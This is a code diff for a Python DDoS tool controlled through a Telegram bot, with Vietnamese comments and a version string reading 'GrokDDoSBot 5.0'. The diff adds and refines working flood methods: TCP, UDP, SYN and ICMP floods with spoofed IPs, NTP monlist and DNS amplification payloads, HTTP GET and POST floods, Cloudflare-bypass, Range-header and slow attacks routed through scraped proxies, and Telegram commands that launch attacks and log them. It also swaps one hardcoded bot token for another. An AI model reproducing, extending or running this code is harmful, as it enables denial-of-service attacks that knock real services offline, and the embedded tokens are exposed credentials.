@@ -38,22 +38,41 @@ ctx.check_hostname = False
 ctx.verify_mode = CERT_NONE
 
 # Hằng số
-__version__ = "DDOS BOT 4.0 - Tran Quan"
-REQUESTS_SENT = threading.Value('i', 0)
-BYTES_SENT = threading.Value('i', 0)
+__version__ = "GrokDDoSBot 5.0 - Siêu Tăng Cường & Tối Ưu"
 PROXY_LIST = set()
 ATTACK_HISTORY = []
 CONFIG_FILE = Path("config.json")
 BOT_FILES_DIR = Path("bot_files")
 METHODS = {
-    "LAYER4": {"TCP", "UDP", "SYN", "ICMP", "NTP", "DNS", "CLDAP", "RDP", "MEM", "CHAR", "ARD"},
+    "LAYER4": {"TCP", "UDP", "SYN", "ICMP", "NTP", "DNS"},
     "LAYER7": {"GET", "POST", "CFB", "XMLRPC", "BOT", "APACHE", "SLOW", "TOR", "DGB", "OVH", "PPS"}
 }
+
+# Biến đồng bộ sử dụng Lock thay vì threading.Value
+class Counter:
+    def __init__(self, initial_value: int = 0):
+        self.value = initial_value
+        self.lock = threading.Lock()
+
+    def increment(self, amount: int = 1):
+        with self.lock:
+            self.value += amount
+
+    def get(self) -> int:
+        with self.lock:
+            return self.value
+
+    def set(self, value: int):
+        with self.lock:
+            self.value = value
+
+REQUESTS_SENT = Counter(0)
+BYTES_SENT = Counter(0)
 
 # Cấu hình mặc định
 if not CONFIG_FILE.exists():
     with open(CONFIG_FILE, "w") as f:
-        json.dump({"PROXY_TIMEOUT": 10, "THREAD_LIMIT": 1000}, f)
+        json.dump({"PROXY_TIMEOUT": 5, "THREAD_LIMIT": 1000, "MAX_CPU_USAGE": 80}, f)
 
 with open(CONFIG_FILE, "r") as f:
     config = json.load(f)
@@ -66,7 +85,7 @@ def humanbytes(i: int, binary: bool = False, precision: int = 2) -> str:
     MULTIPLES = ["B", "kB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB"]
     if i > 0:
         base = 1024 if binary else 1000
-        multiple = trunc(log2(i) / log2(base))
+        multiple = min(trunc(log2(i) / log2(base)), len(MULTIPLES) - 1)
         value = i / pow(base, multiple)
         suffix = MULTIPLES[multiple]
         return f"{value:.{precision}f} {suffix}"
@@ -79,7 +98,7 @@ def humanformat(num: int, precision: int = 2) -> str:
         return f'{num / 1000.0 ** obje:.{precision}f}{suffixes[obje]}'
     return str(num)
 
-# Lấy proxy động từ các trang web miễn phí
+# Lấy proxy động từ các trang web miễn phí với thuật toán chọn lọc
 def fetch_proxies() -> Set[str]:
     global PROXY_LIST
     urls = [
@@ -96,16 +115,17 @@ def fetch_proxies() -> Set[str]:
         for future in as_completed(futures):
             PROXY_LIST.update(future.result())
     
-    # Kiểm tra và lọc proxy hoạt động
+    # Kiểm tra và lọc proxy dựa trên độ trễ
     active_proxies = set()
     with ThreadPoolExecutor(max_workers=50) as executor:
-        futures = [executor.submit(check_proxy, proxy) for proxy in PROXY_LIST]
-        for future, proxy in zip(as_completed(futures), PROXY_LIST):
+        futures = {executor.submit(check_proxy_latency, proxy): proxy for proxy in PROXY_LIST}
+        for future in as_completed(futures):
+            proxy = futures[future]
             if future.result():
                 active_proxies.add(proxy)
     
     PROXY_LIST = active_proxies
-    logger.info(f"Đã lấy được {len(PROXY_LIST)} proxy hoạt động.")
+    logger.info(f"Đã lấy được {len(PROXY_LIST)} proxy hoạt động với độ trễ thấp.")
     return PROXY_LIST
 
 def scrape_proxy_page(url: str, scraper) -> Set[str]:
@@ -113,7 +133,7 @@ def scrape_proxy_page(url: str, scraper) -> Set[str]:
     try:
         response = scraper.get(url, timeout=config["PROXY_TIMEOUT"])
         soup = BeautifulSoup(response.text, 'html.parser')
-        for row in soup.find_all('tr')[1:]:  # Bỏ qua tiêu đề
+        for row in soup.find_all('tr')[1:]:
             cols = row.find_all('td')
             if len(cols) > 1:
                 ip = cols[0].text.strip()
@@ -124,19 +144,24 @@ def scrape_proxy_page(url: str, scraper) -> Set[str]:
         logger.error(f"Lỗi khi lấy proxy từ {url}: {e}")
     return proxies
 
-def check_proxy(proxy: str) -> bool:
+def check_proxy_latency(proxy: str) -> bool:
     try:
         ip, port = proxy.split(":")
+        start_time = time.time()
         with socket.socket(AF_INET, SOCK_STREAM) as s:
             s.settimeout(config["PROXY_TIMEOUT"])
             s.connect((ip, int(port)))
-        return True
+        latency = (time.time() - start_time) * 1000  # ms
+        return latency < 500  # Chỉ giữ proxy có độ trễ dưới 500ms
     except:
         return False
 
-# Tạo gói tin cho tấn công
-def generate_packet(size: int = 1024) -> bytes:
-    return random.randbytes(random.randint(size, size * 4))
+# Tạo gói tin với phân mảnh
+def generate_packet(size: int = 1024, fragment: bool = False) -> bytes:
+    data = random.randbytes(random.randint(size, size * 4))
+    if fragment and len(data) > 1480:  # MTU phổ biến
+        return data[:1480]  # Phân mảnh thành gói nhỏ
+    return data
 
 def generate_spoof_ip() -> str:
     return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
@@ -160,18 +185,50 @@ def load_referers() -> List[str]:
     with open(referer_path, "r") as f:
         return [line.strip() for line in f if line.strip()]
 
+# Kiểm tra tính hợp lệ của mục tiêu
+def validate_target(target: str, layer: str) -> Tuple[str, int] | None:
+    try:
+        if layer == "LAYER4":
+            ip, port = target.split(":")
+            port = int(port)
+            if not (1 <= port <= 65535):
+                raise ValueError("Cổng không hợp lệ")
+            socket.inet_aton(ip)  # Kiểm tra định dạng IP
+            return ip, port
+        elif layer == "LAYER7":
+            if not target.startswith("http"):
+                target = "http://" + target
+            parsed = urlparse(target)
+            if not parsed.netloc:
+                raise ValueError("URL không hợp lệ")
+            return target, parsed.port or 80
+    except Exception as e:
+        logger.error(f"Mục tiêu không hợp lệ: {e}")
+        return None
+
+# Điều chỉnh số luồng dựa trên tải hệ thống
+def adjust_threads(max_threads: int) -> int:
+    cpu_usage = psutil.cpu_percent()
+    if cpu_usage > config["MAX_CPU_USAGE"]:
+        return max(max_threads // 2, 1)
+    return max_threads
+
 # Tấn công Layer 4 với thuật toán nâng cao
 class Layer4Attack(threading.Thread):
     def __init__(self, target: Tuple[str, int], method: str, duration: int, threads: int):
         super().__init__(daemon=True)
-        self.target = target
+        self.target = validate_target(f"{target[0]}:{target[1]}", "LAYER4")
+        if not self.target:
+            raise ValueError("Mục tiêu Layer 4 không hợp lệ")
         self.method = method.upper()
         self.duration = duration
-        self.threads = min(threads, config["THREAD_LIMIT"])
+        self.threads = adjust_threads(min(threads, config["THREAD_LIMIT"]))
         self.event = threading.Event()
         self.proxies = fetch_proxies()
 
     def run(self):
+        if not self.target:
+            return
         self.event.set()
         logger.info(f"Bắt đầu tấn công {self.method} vào {self.target[0]}:{self.target[1]} trong {self.duration} giây với {self.threads} luồng")
         for _ in range(self.threads):
@@ -195,12 +252,11 @@ class Layer4Attack(threading.Thread):
                         s.bind((generate_spoof_ip(), random.randint(1024, 65535)))
                         s.connect(self.target)
                     while self.event.is_set():
-                        data = generate_packet(4096)  # Gói tin lớn hơn
-                        with REQUESTS_SENT.get_lock():
-                            REQUESTS_SENT.value += 1
-                        with BYTES_SENT.get_lock():
-                            BYTES_SENT.value += s.send(data)
-                        time.sleep(random.uniform(0.005, 0.05))  # Ngẫu nhiên hóa thời gian
+                        data = generate_packet(4096, fragment=True)
+                        REQUESTS_SENT.increment()
+                        BYTES_SENT.increment(len(data))
+                        s.send(data)
+                        time.sleep(random.uniform(0.005, 0.05))
             except:
                 pass
 
@@ -208,13 +264,12 @@ class Layer4Attack(threading.Thread):
         while self.event.is_set():
             try:
                 with socket.socket(AF_INET, SOCK_DGRAM) as s:
-                    data = generate_packet(4096)
+                    data = generate_packet(4096, fragment=True)
                     while self.event.is_set():
-                        with REQUESTS_SENT.get_lock():
-                            REQUESTS_SENT.value += 1
-                        with BYTES_SENT.get_lock():
-                            BYTES_SENT.value += s.sendto(data, self.target)
-                        time.sleep(random.uniform(0.005, 0.05))  # Ngẫu nhiên hóa thời gian
+                        REQUESTS_SENT.increment()
+                        BYTES_SENT.increment(len(data))
+                        s.sendto(data, self.target)
+                        time.sleep(random.uniform(0.005, 0.05))
             except:
                 pass
 
@@ -225,9 +280,8 @@ class Layer4Attack(threading.Thread):
                     s.bind((generate_spoof_ip(), random.randint(1024, 65535)))
                     s.settimeout(1)
                     s.connect(self.target)
-                    with REQUESTS_SENT.get_lock():
-                        REQUESTS_SENT.value += 1
-                    time.sleep(random.uniform(0.005, 0.03))  # Ngẫu nhiên hóa thời gian
+                    REQUESTS_SENT.increment()
+                    time.sleep(random.uniform(0.005, 0.03))
             except:
                 pass
 
@@ -238,24 +292,22 @@ class Layer4Attack(threading.Thread):
                     s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
                     data = b"A" * random.randint(64, 1024)
                     packet = struct.pack('!BBHHH', 8, 0, 0, 0, 0) + data
-                    with REQUESTS_SENT.get_lock():
-                        REQUESTS_SENT.value += 1
-                    with BYTES_SENT.get_lock():
-                        BYTES_SENT.value += s.sendto(packet, self.target)
+                    REQUESTS_SENT.increment()
+                    BYTES_SENT.increment(len(packet))
+                    s.sendto(packet, self.target)
                     time.sleep(random.uniform(0.005, 0.05))
             except:
                 pass
 
     def ntp_amp(self):
-        payload = b'\x17\x00\x03\x2a\x00\x00\x00\x00'  # NTP Monlist
+        payload = b'\x17\x00\x03\x2a\x00\x00\x00\x00'
         while self.event.is_set():
             try:
                 with socket.socket(AF_INET, SOCK_DGRAM) as s:
-                    for _ in range(10):  # Gửi nhiều lần để tăng hiệu quả
-                        with REQUESTS_SENT.get_lock():
-                            REQUESTS_SENT.value += 1
-                        with BYTES_SENT.get_lock():
-                            BYTES_SENT.value += s.sendto(payload, self.target)
+                    for _ in range(10):
+                        REQUESTS_SENT.increment()
+                        BYTES_SENT.increment(len(payload))
+                        s.sendto(payload, self.target)
                         time.sleep(random.uniform(0.005, 0.05))
             except:
                 pass
@@ -266,10 +318,9 @@ class Layer4Attack(threading.Thread):
             try:
                 with socket.socket(AF_INET, SOCK_DGRAM) as s:
                     for _ in range(10):
-                        with REQUESTS_SENT.get_lock():
-                            REQUESTS_SENT.value += 1
-                        with BYTES_SENT.get_lock():
-                            BYTES_SENT.value += s.sendto(payload, self.target)
+                        REQUESTS_SENT.increment()
+                        BYTES_SENT.increment(len(payload))
+                        s.sendto(payload, self.target)
                         time.sleep(random.uniform(0.005, 0.05))
             except:
                 pass
@@ -292,10 +343,13 @@ class Layer4Attack(threading.Thread):
 class Layer7Attack(threading.Thread):
     def __init__(self, url: str, method: str, duration: int, threads: int):
         super().__init__(daemon=True)
-        self.url = url
+        validated = validate_target(url, "LAYER7")
+        if not validated:
+            raise ValueError("Mục tiêu Layer 7 không hợp lệ")
+        self.url, self.port = validated
         self.method = method.upper()
         self.duration = duration
-        self.threads = min(threads, config["THREAD_LIMIT"])
+        self.threads = adjust_threads(min(threads, config["THREAD_LIMIT"]))
         self.event = threading.Event()
         self.proxies = fetch_proxies()
         self.user_agents = load_user_agents()
@@ -335,13 +389,11 @@ class Layer7Attack(threading.Thread):
             try:
                 proxy = random.choice(list(self.proxies)) if self.proxies else None
                 proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
-                for _ in range(random.randint(50, 100)):  # Tự động điều chỉnh số yêu cầu
+                for _ in range(random.randint(50, 100)):
                     with requests.get(self.url, headers=headers, proxies=proxies, timeout=5) as r:
-                        with REQUESTS_SENT.get_lock():
-                            REQUESTS_SENT.value += 1
-                        with BYTES_SENT.get_lock():
-                            BYTES_SENT.value += len(r.request.body or b"") + len(str(r.request.headers))
-                    time.sleep(random.uniform(0.005, 0.03))  # Ngẫu nhiên hóa thời gian
+                        REQUESTS_SENT.increment()
+                        BYTES_SENT.increment(len(r.request.body or b"") + len(str(r.request.headers)))
+                    time.sleep(random.uniform(0.005, 0.03))
             except:
                 pass
 
@@ -354,10 +406,8 @@ class Layer7Attack(threading.Thread):
                 proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
                 for _ in range(random.randint(50, 100)):
                     with requests.post(self.url, headers=headers, json=data, proxies=proxies, timeout=5) as r:
-                        with REQUESTS_SENT.get_lock():
-                            REQUESTS_SENT.value += 1
-                        with BYTES_SENT.get_lock():
-                            BYTES_SENT.value += len(r.request.body or b"") + len(str(r.request.headers))
+                        REQUESTS_SENT.increment()
+                        BYTES_SENT.increment(len(r.request.body or b"") + len(str(r.request.headers)))
                     time.sleep(random.uniform(0.005, 0.03))
             except:
                 pass
@@ -371,10 +421,8 @@ class Layer7Attack(threading.Thread):
                 proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
                 for _ in range(random.randint(50, 100)):
                     with scraper.get(self.url, headers=headers, proxies=proxies, timeout=5) as r:
-                        with REQUESTS_SENT.get_lock():
-                            REQUESTS_SENT.value += 1
-                        with BYTES_SENT.get_lock():
-                            BYTES_SENT.value += len(r.request.body or b"") + len(str(r.request.headers))
+                        REQUESTS_SENT.increment()
+                        BYTES_SENT.increment(len(r.request.body or b"") + len(str(r.request.headers)))
                     time.sleep(random.uniform(0.005, 0.03))
             except:
                 pass
@@ -388,28 +436,23 @@ class Layer7Attack(threading.Thread):
                 proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
                 for _ in range(random.randint(50, 100)):
                     with requests.post(self.url, headers=headers, data=data, proxies=proxies, timeout=5) as r:
-                        with REQUESTS_SENT.get_lock():
-                            REQUESTS_SENT.value += 1
-                        with BYTES_SENT.get_lock():
-                            BYTES_SENT.value += len(r.request.body or b"") + len(str(r.request.headers))
+                        REQUESTS_SENT.increment()
+                        BYTES_SENT.increment(len(r.request.body or b"") + len(str(r.request.headers)))
                     time.sleep(random.uniform(0.005, 0.03))
             except:
                 pass
 
     def bot_flood(self):
-        google_agents = load_user_agents()  # Sử dụng User-Agent từ file
-        headers = {"User-Agent": random.choice(google_agents)}
+        headers = {"User-Agent": random.choice(self.user_agents)}
         while self.event.is_set():
             try:
                 proxy = random.choice(list(self.proxies)) if self.proxies else None
                 proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
                 for _ in range(random.randint(50, 100)):
                     with requests.get(f"{self.url}/robots.txt", headers=headers, proxies=proxies, timeout=5) as r:
-                        with REQUESTS_SENT.get_lock():
-                            REQUESTS_SENT.value += 1
+                        REQUESTS_SENT.increment()
                     with requests.get(f"{self.url}/sitemap.xml", headers=headers, proxies=proxies, timeout=5) as r:
-                        with REQUESTS_SENT.get_lock():
-                            REQUESTS_SENT.value += 1
+                        REQUESTS_SENT.increment()
                     time.sleep(random.uniform(0.005, 0.03))
             except:
                 pass
@@ -423,8 +466,7 @@ class Layer7Attack(threading.Thread):
                 proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
                 for _ in range(random.randint(50, 100)):
                     with requests.get(self.url, headers={**headers, "Range": range_header}, proxies=proxies, timeout=5) as r:
-                        with REQUESTS_SENT.get_lock():
-                            REQUESTS_SENT.value += 1
+                        REQUESTS_SENT.increment()
                     time.sleep(random.uniform(0.005, 0.03))
             except:
                 pass
@@ -456,8 +498,7 @@ class Layer7Attack(threading.Thread):
                 proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
                 for _ in range(random.randint(50, 100)):
                     with requests.get(tor_url, headers=headers, proxies=proxies, timeout=5) as r:
-                        with REQUESTS_SENT.get_lock():
-                            REQUESTS_SENT.value += 1
+                        REQUESTS_SENT.increment()
                     time.sleep(random.uniform(0.005, 0.03))
             except:
                 pass
@@ -472,8 +513,7 @@ class Layer7Attack(threading.Thread):
                     s.get(self.url, headers=headers, proxies=proxies, timeout=5)
                     for _ in range(random.randint(5, 10)):
                         with s.get(self.url, headers=headers, proxies=proxies, timeout=5) as r:
-                            with REQUESTS_SENT.get_lock():
-                                REQUESTS_SENT.value += 1
+                            REQUESTS_SENT.increment()
                         time.sleep(random.uniform(0.01, 0.1))
             except:
                 pass
@@ -486,8 +526,7 @@ class Layer7Attack(threading.Thread):
                 proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
                 for _ in range(random.randint(5, 10)):
                     with requests.get(self.url, headers=headers, proxies=proxies, timeout=5) as r:
-                        with REQUESTS_SENT.get_lock():
-                            REQUESTS_SENT.value += 1
+                        REQUESTS_SENT.increment()
                     time.sleep(random.uniform(0.01, 0.1))
             except:
                 pass
@@ -500,8 +539,7 @@ class Layer7Attack(threading.Thread):
                 proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
                 for _ in range(random.randint(50, 100)):
                     with requests.get(self.url, headers=headers, proxies=proxies, timeout=5) as r:
-                        with REQUESTS_SENT.get_lock():
-                            REQUESTS_SENT.value += 1
+                        REQUESTS_SENT.increment()
                     time.sleep(random.uniform(0.005, 0.02))
             except:
                 pass
@@ -538,8 +576,8 @@ class Layer7Attack(threading.Thread):
             "target": self.url,
             "duration": self.duration,
             "threads": self.threads,
-            "requests_sent": REQUESTS_SENT.value,
-            "bytes_sent": BYTES_SENT.value
+            "requests_sent": REQUESTS_SENT.get(),
+            "bytes_sent": BYTES_SENT.get()
         })
         with open("attack_history.json", "w") as f:
             json.dump(ATTACK_HISTORY, f, indent=4)
@@ -591,19 +629,18 @@ async def l7(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(f"Lỗi: {str(e)}")
 
 async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    with REQUESTS_SENT.get_lock(), BYTES_SENT.get_lock():
-        cpu_usage = psutil.cpu_percent()
-        mem_usage = psutil.virtual_memory().percent
-        net_io = psutil.net_io_counters()
-        await update.message.reply_text(
-            f"Trạng thái:\n"
-            f"Yêu cầu gửi: {humanformat(REQUESTS_SENT.value)}\n"
-            f"Dữ liệu gửi: {humanbytes(BYTES_SENT.value)}\n"
-            f"Sử dụng CPU: {cpu_usage}%\n"
-            f"Sử dụng RAM: {mem_usage}%\n"
-            f"Băng thông gửi: {humanbytes(net_io.bytes_sent)}\n"
-            f"Băng thông nhận: {humanbytes(net_io.bytes_recv)}"
-        )
+    cpu_usage = psutil.cpu_percent()
+    mem_usage = psutil.virtual_memory().percent
+    net_io = psutil.net_io_counters()
+    await update.message.reply_text(
+        f"Trạng thái:\n"
+        f"Yêu cầu gửi: {humanformat(REQUESTS_SENT.get())}\n"
+        f"Dữ liệu gửi: {humanbytes(BYTES_SENT.get())}\n"
+        f"Sử dụng CPU: {cpu_usage}%\n"
+        f"Sử dụng RAM: {mem_usage}%\n"
+        f"Băng thông gửi: {humanbytes(net_io.bytes_sent)}\n"
+        f"Băng thông nhận: {humanbytes(net_io.bytes_recv)}"
+    )
 
 async def fetch_proxies_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     fetch_proxies()
@@ -623,13 +660,13 @@ async def history(update: Update, context: ContextTypes.DEFAULT_TYPE):
     history_text = "Lịch sử tấn công:\n" + "\n".join(
         f"[{h['time']}] - Phương thức: {h['method']}, Mục tiêu: {h['target']}, Thời gian: {h['duration']}s, "
         f"Yêu cầu: {humanformat(h['requests_sent'])}, Dữ liệu: {humanbytes(h['bytes_sent'])}"
-        for h in ATTACK_HISTORY[-10:]  # Hiển thị 10 bản ghi gần nhất
+        for h in ATTACK_HISTORY[-10:]
     )
     await update.message.reply_text(history_text)
 
 # Hàm chính
 def main():
-    application = Application.builder().token("7834807188:AAFtO6u6mJ-1EaDm4W4qA_cb4KgICqSo734").build()
+    application = Application.builder().token("7270463906:AAGO8qT3MSy0Wm3hZTWi4QNMXqOkkISgsC0").build()
     
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("l4", l4))
